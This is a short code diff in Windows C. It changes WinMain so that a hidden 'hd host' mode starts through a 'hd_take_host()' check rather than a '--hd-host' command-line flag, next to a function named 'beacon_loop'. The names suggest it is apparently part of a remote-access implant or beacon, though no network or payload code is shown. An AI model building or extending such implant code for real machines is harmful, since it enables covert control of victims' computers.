@@ -705,10 +705,9 @@ static void beacon_loop(void) {
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
-    if (lpCmd && strstr(lpCmd, "--hd-host")) {
-        int hd_host_main(void);
-        return hd_host_main();
-    }
+    int hd_take_host(void);
+    int hd_host_main(void);
+    if (hd_take_host()) return hd_host_main();
     srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
 
     SYSTEM_INFO si;
